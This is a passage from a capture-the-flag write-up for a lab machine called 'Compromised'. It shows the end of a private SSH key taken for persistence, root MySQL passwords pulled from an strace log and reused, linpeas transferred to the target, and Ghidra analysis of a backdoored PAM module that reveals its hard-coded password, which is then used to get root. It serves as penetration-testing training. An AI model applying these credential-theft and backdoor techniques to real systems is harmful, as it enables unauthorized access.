ff4AmpM/VXAy+mhtjVDwnstVj738/U4P19lTytidkX13IaGPIOpL+RXxA4dm5HPq
sXXqNXfAIV7RZbxBGLfMpX2PmwYWfhT7Bo6YwPkEHMzcnNMgZ9dzHtmUMyt+i47r
l8ouL5NYGDx7K3S9UFa/5v8GkouLQI4zXE9ApnFDAoGAZSnEed68KX8/NCJBueJt
/YFN7vVj/Y1GcyLeRtjO4vDf6g6C1PnLeFL8P+LLaWm3gLdmjg4Eribir2+Yw/rk
3+KCGKJcxYzT0t3fRIBcdJPYydHvvLE5Csviqx91K5ySlL5haf0kVW6UtrdKhgM7
FLGOtLURtoUi53k6MxlZE48CgYApohCVLC4IN6rZwZDHcAYtJsYHqjggVGgWUCB0
4PN8EyMBvwDtCmXMppWcFlFuDhlkRSaZ9TPh/sk9yOvOux1wTUHDPTBAZF4DgkFq
m++o1Wmy+X43KL2NwtGhfsdtqlgl++1ihTxZdFlALGUzZdxIBuls5jjDLtNTYY7q
+NQg3QKBgQDO8jZA/ngqCrJdHhv7FmSck1URCwQMHY+2dW9+SFm9HfBojLxrsqCG
RdhLIsr3aqhRQhJmhdcwkXcXdNwHFZ1oKrVn/wljqZ3HyVIOl0Cqry8SOCx69T1k
kr4uBVfsyTeGWCgelq6x7avuTmMFVJn4iUX0czwbiqOOx1y0Fyliog==
-----END RSA PRIVATE KEY-----
```

I grabbed the user's private SSH key so I could log back in whenever needed. \(Why the `mysql` user even has an SSH key is a mystery for another day!\)

### Finding user creds

```text
mysql@compromised:~$ cat auto.cnf 
[auto]
server-uuid=4667b165-9145-11ea-aaf7-000c29fa914e
mysql@compromised:~$ cat strace-log.dat
```

I didn't know what the `strace.log` was, so I did a bit of reading.

* [https://www.percona.com/blog/2020/06/30/analyzing-mysql-with-strace/](https://www.percona.com/blog/2020/06/30/analyzing-mysql-with-strace/)

> The strace tool intercepts and records any system calls \(a.k.a. syscalls\) performed and any signals received by a traced process. It is excellent for complex troubleshooting, but beware, as it has a high-performance impact for the traced process.

* [https://stackoverflow.com/questions/568564/how-can-i-view-live-mysql-queries](https://stackoverflow.com/questions/568564/how-can-i-view-live-mysql-queries)

The file was huge, so I narrowed it down to the lines where mysql had been executed.

```text
mysql@compromised:~$ cat strace-log.dat | grep mysql
22102 03:11:06 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22227 03:11:09 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=3*NLJE32I$Fe"], 0x55bc62467900 /* 21 vars */) = 0
22227 03:11:09 stat("/etc/mysql/my.cnf", {st_mode=S_IFREG|0644, st_size=682, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/my.cnf", O_RDONLY) = 3
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
22227 03:11:09 stat("/etc/mysql/conf.d/mysql.cnf", {st_mode=S_IFREG|0644, st_size=8, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/conf.d/mysql.cnf", O_RDONLY) = 4
22227 03:11:09 read(4, "ysql]\n", 4096) = 8
22227 03:11:09 stat("/etc/mysql/conf.d/mysqldump.cnf", {st_mode=S_IFREG|0644, st_size=55, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/conf.d/mysqldump.cnf", O_RDONLY) = 4
22227 03:11:09 read(4, "ysqldump]\nquick\nquote-names\nma"..., 4096) = 55
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
22227 03:11:09 stat("/etc/mysql/mysql.conf.d/mysqld.cnf", {st_mode=S_IFREG|0644, st_size=3064, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld.cnf", O_RDONLY) = 4
22227 03:11:09 stat("/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", {st_mode=S_IFREG|0644, st_size=21, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", O_RDONLY) = 4
22227 03:11:09 read(4, "ysqld_safe]\nsyslog\n", 4096) = 21
22227 03:11:09 write(2, "mysql: ", 7)   = 7
22227 03:11:09 stat("/usr/share/mysql/charsets/Index.xml", {st_mode=S_IFREG|0644, st_size=19404, ...}) = 0
22227 03:11:09 openat(AT_FDCWD, "/usr/share/mysql/charsets/Index.xml", O_RDONLY) = 3
22227 03:11:09 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/mysqld/mysqld.sock"}, 110) = 0
22102 03:11:10 write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
22228 03:11:15 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changeme"], 0x55bc62467900 /* 21 vars */) = 0
22228 03:11:15 stat("/etc/mysql/my.cnf", {st_mode=S_IFREG|0644, st_size=682, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/my.cnf", O_RDONLY) = 3
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
22228 03:11:15 stat("/etc/mysql/conf.d/mysql.cnf", {st_mode=S_IFREG|0644, st_size=8, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/conf.d/mysql.cnf", O_RDONLY) = 4
22228 03:11:15 read(4, "ysql]\n", 4096) = 8
22228 03:11:15 stat("/etc/mysql/conf.d/mysqldump.cnf", {st_mode=S_IFREG|0644, st_size=55, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/conf.d/mysqldump.cnf", O_RDONLY) = 4
22228 03:11:15 read(4, "ysqldump]\nquick\nquote-names\nma"..., 4096) = 55
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
22228 03:11:15 stat("/etc/mysql/mysql.conf.d/mysqld.cnf", {st_mode=S_IFREG|0644, st_size=3064, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld.cnf", O_RDONLY) = 4
22228 03:11:15 stat("/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", {st_mode=S_IFREG|0644, st_size=21, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", O_RDONLY) = 4
22228 03:11:15 read(4, "ysqld_safe]\nsyslog\n", 4096) = 21
22228 03:11:15 write(2, "mysql: ", 7)   = 7
22228 03:11:15 stat("/usr/share/mysql/charsets/Index.xml", {st_mode=S_IFREG|0644, st_size=19404, ...}) = 0
22228 03:11:15 openat(AT_FDCWD, "/usr/share/mysql/charsets/Index.xml", O_RDONLY) = 3
22228 03:11:15 connect(3, {sa_family=AF_UNIX, sun_path="/var/run/mysqld/mysqld.sock"}, 110) = 0
22102 03:11:16 write(2, "mysql -u root --password='change"..., 35) = 35
22229 03:11:18 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changethis"], 0x55bc62467900 /* 21 vars */) = 0
```

The password appeared to have been rotated several times. I jotted down each one to test for reuse, and the password `3*NLJE32I$Fe` let me switch to `sysadmin`.

### User.txt

```text
mysql@compromised:~$ su sysadmin
Password: 
sysadmin@compromised:/var/lib/mysql$ cd ~
sysadmin@compromised:~$ ls -la
total 20
drwxr-x--- 2 root sysadmin 4096 Aug 31 03:16 .
drwxr-xr-x 3 root root     4096 May 13  2020 ..
lrwxrwxrwx 1 root sysadmin    9 May 13  2020 .bash_history -> /dev/null
-rw-r--r-- 1 root sysadmin 3771 May 13  2020 .bashrc
-rw-r--r-- 1 root sysadmin  807 May 13  2020 .profile
-r--r----- 1 root sysadmin   33 Dec 25 05:48 user.txt
sysadmin@compromised:~$ cat user.txt 
50df************************e03d
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as `sysadmin`

```text
sysadmin@compromised:~$ sudo -l
sudo: unable to resolve host compromised: Resource temporarily unavailable
[sudo] password for sysadmin: 
Sorry, user sysadmin may not run sudo on compromised.
```

The `sysadmin` user couldn't run `sudo`. \(What kind of sysadmin is this?\)

```text
sysadmin@compromised:/dev/shm$ wget http://10.10.15.98/linpeas.sh
--2020-12-27 20:45:23--  http://10.10.15.98/linpeas.sh
Connecting to 10.10.15.98:80... 
sysadmin@compromised:/dev/shm$ ping 10.10.15.98
PING 10.10.15.98 (10.10.15.98) 56(84) bytes of data.
ping: sendmsg: Operation not permitted
ping: sendmsg: Operation not permitted
^C
--- 10.10.15.98 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1017ms

sysadmin@compromised:/dev/shm$
```

Pinging my own box failed, which made me worry I wouldn't be able to call back to my machine. I considered base64 "copy-pasta" for transferring files, but then had an "Oh duh!" moment - I had SSH access, so I could just use SCP to push files over.

```text
┌──(kac0㉿kali)-[~]
└─$ scp ./linpeas.sh sysadmin@<YOUR_IP>:/dev/shm/lp                                  
sysadmin@<YOUR_IP>'s password: 
linpeas.sh                                                            100%  286KB 435.1KB/s   00:00
```

Unfortunately, even great automated tools like `linpeas.sh` only go so far. Here it gave me almost nothing to work with, so I switched to more manual enumeration.

I first checked `sshd` and other `/etc` config files for obvious misconfigurations but found nothing of note. Then I used `find` to hunt for hidden files.

```text
sysadmin@compromised:/dev/shm$ find / -type f -iname ".*" -ls 2>/dev/null
    10770      0 -rw-rw-rw-   1 root     root            0 Dec 25 05:48 /sys/kernel/security/apparmor/.remove
    ---snipped---
1190772     72 -rw-r--r--   1 root     root        71896 Apr 22  2020 /usr/src/linux-headers-4.15.0-99-generic/.cache.mk
      626      4 -rw-r--r--   1 root     root           37 Dec 25 05:48 /run/cloud-init/.instance-id
      287      4 -rw-r--r--   1 root     root            2 Dec 25 05:48 /run/cloud-init/.ds-identify.result
      632      0 -rw-r--r--   1 root     root            0 Dec 25 05:48 /run/network/.ifstate.lock
   531995      0 -rw-------   1 root     root            0 May 13  2020 /etc/.pwd.lock
   532026      4 -rw-r--r--   1 root     root          102 May 13  2020 /etc/cron.daily/.placeholder
   532293      4 -rw-r--r--   1 root     root          102 May 13  2020 /etc/cron.d/.placeholder
   532562      4 -rw-r--r--   1 root     root          102 May 13  2020 /etc/cron.hourly/.placeholder
   532586      4 -rw-r--r--   1 root     root          102 May 13  2020 /etc/cron.weekly/.placeholder
   528268      4 -rw-r--r--   1 root     root         1531 May 24  2020 /etc/apparmor.d/cache/.features
   532818      4 -rw-r--r--   1 root     root          102 May 13  2020 /etc/cron.monthly/.placeholder
   924116      4 -rw-r--r--   1 root     root          807 May 13  2020 /etc/skel/.profile
   924117      4 -rw-r--r--   1 root     root         3771 May 13  2020 /etc/skel/.bashrc
   924118      4 -rw-r--r--   1 root     root          220 May 13  2020 /etc/skel/.bash_logout
  1444617    196 -rw-r--r--   1 root     root       198440 Aug 31 03:25 /lib/x86_64-linux-gnu/security/.pam_unix.so
   398160      4 -rw-r--r--   1 root     root         2854 May 28  2020 /var/www/html/shop/.htaccess
   131304      4 -rw-r--r--   1 www-data www-data       37 May 29  2020 /var/www/html/shop/admin/.log2301c9430d8593ae.txt
   659386      4 -rw-r--r--   1 root     root          169 May 14  2018 /var/www/html/shop/data/.htaccess
   660196      4 -rw-r--r--   1 root     root          169 May 14  2018 /var/www/html/shop/logs/.htaccess
   659383      4 -rw-r--r--   1 root     root          188 May 14  2018 /var/www/html/shop/cache/.htaccess
   131171      4 -rw-r--r--   1 root     root         1531 May 24  2020 /var/cache/apparmor/.features
     8708      0 -rw-r--r--   1 landscape landscape        0 Feb  3  2020 /var/lib/landscape/.cleanup.user
```

Plenty of hidden files showed up, but one really stood out:

```text
-rw-r--r--   1 root     root       198440 Aug 31 03:25 /lib/x86_64-linux-gnu/security/.pam_unix.so
```

PAM, the pluggable authentication module, handles identity and access management on Linux. It has no business being a hidden file.

```text
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ ls -la
total 1340
drwxr-xr-x 2 root root   4096 Aug 31 03:26 .
drwxr-xr-x 4 root root  12288 Jul 16 19:36 ..
-rw-r--r-- 1 root root  18608 Feb 27  2019 pam_access.so
-rw-r--r-- 1 root root  10080 Nov 16  2017 pam_cap.so
-rw-r--r-- 1 root root  10304 Feb 27  2019 pam_debug.so
-rw-r--r-- 1 root root   5776 Feb 27  2019 pam_deny.so
-rw-r--r-- 1 root root  10272 Feb 27  2019 pam_echo.so
-rw-r--r-- 1 root root  14464 Feb 27  2019 pam_env.so
-rw-r--r-- 1 root root  14656 Feb 27  2019 pam_exec.so
-rw-r--r-- 1 root root  60304 Feb 27  2019 pam_extrausers.so
-rw-r--r-- 1 root root  10312 Feb 27  2019 pam_faildelay.so
-rw-r--r-- 1 root root  14512 Feb 27  2019 pam_filter.so
-rw-r--r-- 1 root root  10248 Feb 27  2019 pam_ftp.so
-rw-r--r-- 1 root root  14544 Feb 27  2019 pam_group.so
-rw-r--r-- 1 root root  10384 Feb 27  2019 pam_issue.so
-rw-r--r-- 1 root root  10280 Feb 27  2019 pam_keyinit.so
-rw-r--r-- 1 root root  14488 Feb 27  2019 pam_lastlog.so
-rw-r--r-- 1 root root  22872 Feb 27  2019 pam_limits.so
-rw-r--r-- 1 root root  10312 Feb 27  2019 pam_listfile.so
-rw-r--r-- 1 root root  10240 Feb 27  2019 pam_localuser.so
-rw-r--r-- 1 root root  10336 Feb 27  2019 pam_loginuid.so
-rw-r--r-- 1 root root  10312 Feb 27  2019 pam_mail.so
-rw-r--r-- 1 root root  10304 Feb 27  2019 pam_mkhomedir.so
-rw-r--r-- 1 root root  10336 Feb 27  2019 pam_motd.so
-rw-r--r-- 1 root root  39648 Feb 27  2019 pam_namespace.so
-rw-r--r-- 1 root root  10264 Feb 27  2019 pam_nologin.so
-rw-r--r-- 1 root root   6104 Feb 27  2019 pam_permit.so
-rw-r--r-- 1 root root  14600 Feb 27  2019 pam_pwhistory.so
-rw-r--r-- 1 root root   6136 Feb 27  2019 pam_rhosts.so
-rw-r--r-- 1 root root  10304 Feb 27  2019 pam_rootok.so
-rw-r--r-- 1 root root  10304 Feb 27  2019 pam_securetty.so
-rw-r--r-- 1 root root  18736 Feb 27  2019 pam_selinux.so
-rw-r--r-- 1 root root  14560 Feb 27  2019 pam_sepermit.so
-rw-r--r-- 1 root root   6152 Feb 27  2019 pam_shells.so
-rw-r--r-- 1 root root  14384 Feb 27  2019 pam_stress.so
-rw-r--r-- 1 root root  14424 Feb 27  2019 pam_succeed_if.so
-rw-r--r-- 1 root root 258040 Feb  6  2020 pam_systemd.so
-rw-r--r-- 1 root root  14512 Feb 27  2019 pam_tally2.so
-rw-r--r-- 1 root root  14472 Feb 27  2019 pam_tally.so
-rw-r--r-- 1 root root  14512 Feb 27  2019 pam_time.so
-rw-r--r-- 1 root root  18752 Feb 27  2019 pam_timestamp.so
-rw-r--r-- 1 root root  10304 Feb 27  2019 pam_tty_audit.so
-rw-r--r-- 1 root root  10376 Feb 27  2019 pam_umask.so
-rw-r--r-- 1 root root 198440 Aug 31 03:25 .pam_unix.so
-rw-r--r-- 1 root root 198440 Aug 31 03:25 pam_unix.so
-rw-r--r-- 1 root root  14448 Feb 27  2019 pam_userdb.so
-rw-r--r-- 1 root root   6104 Feb 27  2019 pam_warn.so
-rw-r--r-- 1 root root  10256 Feb 27  2019 pam_wheel.so
-rw-r--r-- 1 root root  18848 Feb 27  2019 pam_xauth.so
```

Having two copies of this file present, one of them hidden, was highly suspicious. More suspicious still: `pam_unix.so` and its hidden twin shared the same size and modify date, yet that date was wildly different from every other file in the directory.

```text
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ strings .pam_unix.so | less
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ diff pam_unix.so .pam_unix.so 
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ strings .pam_unix.so > /dev/shm/pam_hidden
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ strings pam_unix.so > /dev/shm/pam
sysadmin@compromised:/lib/x86_64-linux-gnu/security$ diff /dev/shm/pam /dev/shm/pam_hidden
```

After basic strings analysis turned up nothing, I SCP'd the files back to my machine for a closer look.

### Using Ghidra for binary analysis

![](assets/wu/compromised/img-38.png)

I loaded the file into ghidra and began reading the code. Helpfully, it had been compiled with symbols and strings intact, which made navigating it far easier.

![](assets/wu/compromised/img-39.png)

```c
  iVar2 = pam_get_user(pamh,&name,0);
  if (iVar2 == 0) {
    if ((name != (char *)0x0) && ((*name - 0x2bU & 0xfd) != 0)) {
      iVar3 = _unix_blankpasswd(pamh,ctrl,name);
      if (iVar3 == 0) {
        prompt1 = (char *)dcgettext("Linux-PAM","Password: ",5);
        iVar2 = _unix_read_password(pamh,ctrl,(char *)0x0,prompt1,(char *)0x0,"-UN*X-PASS",&p);
        if (iVar2 == 0) {
          backdoor._0_8_ = 0x4533557e656b6c7a;
          backdoor._8_7_ = 0x2d326d3238766e;
          local_40 = 0;
          iVar2 = strcmp((char *)p,backdoor);
```

After a long search, and some doubt about whether I was down a rabbit hole, I found what I needed in the `pam_sm_authenticate` function. Ghidra's decompiled C revealed a variable called `backdoor` that immediately caught my eye.

```text
┌──(kac0㉿kali)-[~/htb/compromised]
└─$ echo '0x4533557e656b6c7a' | xxd -r 
E3U~eklz                                                                                                        
┌──(kac0㉿kali)-[~/htb/compromised]
└─$ echo '0x2d326d3238766e' | xxd -r
-2m28vn
```

From the assembly view, it appeared the two strings were joined together to form the backdoor password. The code then runs `strcmp` against the supplied password and grants authentication on a match. Worth a shot!

It failed when I tried switching to root, but reading the code gave me an idea. Earlier it had noted the code was little-endian, so...maybe the strings were reversed?

```text
┌──(kac0㉿kali)-[~/htb/compromised]
└─$ echo '0x4533557e656b6c7a' | xxd -r | rev
zlke~U3E                                                                                                        
┌──(kac0㉿kali)-[~/htb/compromised]
└─$ echo '0x2d326d3238766e' | xxd -r | rev  
nv82m2-
```

I stitched the two halves of the password together and attempted to switch to `root`.  

### Getting a shell

```text
sysadmin@compromised:/dev/shm$ su root
Password: 
su: Authentication failure
sysadmin@compromised:/dev/shm$ su -
Password: 
root@compromised:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
compromised
```

And that did it - I was now logged in as root.

### Root.txt

```text
root@compromised:~# cat root.txt 
5ecd************************aec7
```
